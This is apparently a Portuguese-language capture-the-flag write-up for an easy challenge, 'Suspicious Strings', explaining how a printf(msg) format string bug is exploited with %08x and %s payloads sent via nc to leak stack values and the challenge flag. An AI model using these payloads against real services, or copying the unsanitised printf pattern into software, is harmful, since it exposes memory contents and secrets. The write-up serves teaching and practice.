# **PWN**

**Autor**: Hakal  
**Desafio**: Suspicious Strings  
**Nível**: Fácil  

---

## **1. Introdução**

Neste write-up, documentaremos a exploração de uma vulnerabilidade de **format string** presente em um binário, fornecido pelo Chapéu de Palha Hacker Club. O objetivo desta exploração foi extrair uma flag diretamente da memória do programa utilizando técnicas de ataques de format string. A exploração foi realizada de forma sistemática, avançando passo a passo pela memória do programa até encontrar a string desejada.

---

## **2. Análise do Código Vulnerável**

O binário em questão apresentava uma falha clássica de segurança em que o usuário pode inserir uma string de formato diretamente na função `printf` sem sanitização. Isso permite que o usuário injete especificadores de formato para manipular a saída e acessar valores armazenados na pilha.

O código vulnerável é o seguinte:

```c
fgets(msg, 300, stdin);   // Lê até 300 caracteres do stdin e armazena em msg
printf(msg);              // Imprime msg diretamente, sem especificador de formato
```

Ao permitir que o usuário controle o argumento da função `printf`, o programa torna-se suscetível a ataques que podem acessar ou modificar dados na memória.

---

## **3. Exploração da Pilha com Format String**

O objetivo desta exploração é **ler valores da pilha** e, eventualmente, encontrar a flag armazenada na memória.

### **Passo 1: Verificando os valores na pilha com %x**

O primeiro passo foi explorar a pilha utilizando o especificador `%08x`, que lê valores de 4 bytes da pilha e os exibe em formato hexadecimal. Com isso, conseguimos inspecionar valores na memória.

Executamos o seguinte comando:

```bash
echo -e '%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x' | nc suspicious-strings.chapeudepalhahacker.club 62345
```

**Saída:**

![Exploração da Pilha com Format String](1.png)

---

### **Passo 2: Acessando strings na memória com %s**

Após ler os valores da pilha, a próxima etapa foi tentar acessar uma **string** que poderia estar armazenada na memória. Para isso, utilizamos o especificador `%s`, que tenta interpretar um valor na pilha como um ponteiro para uma string.

Utilizamos o seguinte comando:

```bash
echo -e '%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%s' | nc suspicious-strings.chapeudepalhahacker.club 62345
```

**Saída:**

![Acessando strings na memória com %s](2.png)

**Análise:**

- Os primeiros valores (`9e63e4d1`, `fbad2088`, etc.) são dados que continuam sendo lidos da pilha.
- O valor mais importante é o último: `9e63d2a0`. Esse valor representa um **ponteiro** que aponta para uma string armazenada na memória.
- O especificador `%s` utilizou esse ponteiro para acessar e exibir o conteúdo da memória. A string recuperada foi a **flag**: `flag{f0rm4t_str1ng_1s_4w3s0m3}`.

---

## **4. Interpretação dos Valores da Pilha**

### **Detalhamento dos valores lidos:**

| Posição na pilha | Valor Lido       | Interpretação                        |
|------------------|------------------|--------------------------------------|
| [Posição 0]      | 9e63e4d1         | Endereço ou valor temporário na pilha         |
| [Posição 1]      | fbad2088         | Possivelmente parte de uma estrutura de controle de I/O (como `FILE`) |
| [Posição 2]      | 619c1b2f         | Outro valor temporário ou ponteiro |
| [Posição 3]      | 9e63e500         | Valor armazenado na pilha, provavelmente um ponteiro ou variável local |
| [Posição 4]      | 00000000         | Valor nulo, frequentemente usado como delimitador ou ponteiro nulo |
| [Posição 5]      | d30f8d68         | Outro endereço temporário armazenado na pilha |
| [Posição 6]      | 00c00000         | Possivelmente um valor relacionado à alocação de memória |
| [Posição 7]      | 00010000         | Valor constante utilizado pelo programa |
| [Posição 8]      | 9e63d2a0         | **Ponteiro para a string da flag** armazenada na memória |
| [Posição 9]      | flag{f0rm4t_str1ng_1s_4w3s0m3} | **Flag recuperada utilizando %s** |

### **Resumo**:

- O uso de `%08x` nos permitiu "andar" pela pilha e ler valores armazenados no stack frame do programa.
- Ao utilizar `%s`, conseguimos acessar um endereço que apontava para a **flag**, armazenada na memória do programa. Esse endereço foi encontrado na posição 8 da pilha.

![Interpretação dos Valores da Pilha](3.png?)

---

## **5. Conclusão**

Este desafio envolveu o processo de:

1. Identificação de uma vulnerabilidade de **format string** que permitia a inserção de especificadores de formato não sanitizados.
2. Inspeção da pilha utilizando o especificador `%08x` para ler valores da memória e identificar variáveis relevantes.
3. Extração de uma string da memória com o especificador `%s`, resultando na recuperação da flag do desafio.

A exploração foi realizada com sucesso ao utilizar essas técnicas para manipular a vulnerabilidade e obter o conteúdo desejado.

---
